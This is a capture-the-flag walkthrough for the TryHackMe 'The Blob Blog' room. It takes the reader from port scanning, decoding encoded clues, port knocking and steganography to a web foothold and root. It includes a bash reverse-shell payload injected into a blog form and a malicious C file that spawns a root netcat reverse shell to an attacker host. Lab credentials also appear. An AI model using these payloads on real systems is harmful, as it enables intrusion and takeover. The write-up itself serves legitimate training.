# [The Blob Blog](https://tryhackme.com/room/theblobblog)

## Successfully hack into bobloblaw's computer

# Root The Box

## Can you root the box?

### User Flag

1. Start by performing a service version scan on the target to identify open ports and running services:

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

2. Navigate to `http://<TARGET_IP>/` and view the page source (`view-source:http://<TARGET_IP>/`). Two HTML comments contain encoded data:

**First comment (Base64 -> Brainfuck):**

```
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
```

Decode from Base64, then decode the resulting Brainfuck code:

```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

**Second comment (Base58 encoded password):**

```
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is:
HcfP8J54AK4
```

Decode from Base58:

```
cUpC4k3s
```

3. Use **knock** to perform port knocking with the discovered sequence:

```bash
knock <TARGET_IP> 1 3 5
```

This will open additional ports that were previously filtered by the firewall.

4. Perform another port scan to verify the newly opened services:

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3)
```

5. Connect to the FTP service using the credentials found earlier:

```bash
ftp <TARGET_IP>
# Username: bob
# Password: cUpC4k3s
prompt off
cd ftp
cd files
get cool.jpeg
```

6. Use **stegseek** to extract hidden data from the JPEG file:

```bash
stegseek cool.jpeg
```

This creates `cool.jpeg.out` containing:

```
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

7. Navigate to `http://<TARGET_IP>:445/bobs_safe_for_stuff`:

```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

8. Use [CacheSleuth Multi-Decoder](https://www.cachesleuth.com/multidecoder/) to decode `zcv:p1fd3v3amT@55n0pr` with the key `youmayenter`.

<img width="1617" height="789" alt="SCREEN01" src="https://github.com/user-attachments/assets/2417c97f-e509-4a67-90f4-37a5ec9c13cb" />

After trying various ciphers, **Vigenère cipher** reveals:

```
bob:d1ff3r3ntP@55w0rd
```

9. Enumerate directories on the web server using **gobuster**:

```bash
gobuster dir -u http://<TARGET_IP>:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/blog                 (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/login                (Status: 200) [Size: 546]
/review               (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/blog1                (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/blog2                (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/blog3                (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/blog4                (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/blog5                (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
/blog6                (Status: 302) [Size: 219] [--> http://<TARGET_IP>:8080/login]
```

10. Access the login page at `http://<TARGET_IP>:8080/login` and authenticate with:

- **Username:** bob
- **Password:** d1ff3r3ntP@55w0rd

11. Set up a **netcat listener** on your attacking machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

12. Navigate to `http://<TARGET_IP>:8080/blog` and inject a **reverse shell payload** into the form:

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Then visit `http://<TARGET_IP>:8080/review` to trigger the payload execution. The reverse shell should connect back to your listener.

13. Once connected, search for **SUID binaries** that might allow privilege escalation:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Notable finding:**

```
/usr/bin/blogFeedback
```

This custom binary stands out among standard SUID binaries and warrants further investigation.

14. Transfer the binary to your machine for analysis. On the target:

```bash
cd /usr/bin
python -m SimpleHTTPServer
```

On your attacking machine:

```bash
wget http://<TARGET_IP>:8000/blogFeedback
```

15. Analyze the binary using **Ghidra**:

- Navigate to `Symbol Tree > Functions > main`

**Decompiled C code:**

```c
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  int local_c;

  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    for (local_c = 1; local_c < 7; local_c = local_c + 1) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}
```

**Analysis:** The binary expects exactly 6 arguments in descending order (6, 5, 4, 3, 2, 1). When provided correctly, it sets the user ID to 1000 (bobloblaw) and spawns a shell.

16. ...

```bash
/usr/bin/blogFeedback 6 5 4 3 2 1
whoami
cat /home/bobloblaw/Desktop/user.txt
```

**Output:**

```bash
whoami
bobloblaw
cat /home/bobloblaw/Desktop/user.txt
THM{C***********************r}

@jakeyee thank you so so so much for the help with the foothold on the box!!
```

---

### Root Flag

1. Upgrade to a fully interactive TTY shell for better stability:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Explore bobloblaw's home directory for potential privilege escalation vectors:

```bash
cd /home/bobloblaw/Documents
ls -la
```

**Interesting findings:**

```
drwxrwx---  2 bobloblaw bobloblaw 4096 Dec 23 04:57 .also_boring
-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
```

3. Craft a malicious C program that spawns a root shell with a reverse connection:

```bash
echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(int argc, char **argv)\n{\nsetreuid(0,0);\nsystem("/bin/sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 5555 >/tmp/f");\nreturn(0);\n}' > .boring_file.c
```

4. Start a new **netcat listener** on port 5555 to catch the root shell:

```bash
nc -lvnp 5555
```

5. Wait for the file to execute (usually within a few minutes). Once connected as root:

```bash
ls
cat root.txt
```

**Output:**

```bash
# ls
root.txt
# cat root.txt
THM{G********************!}
#
```
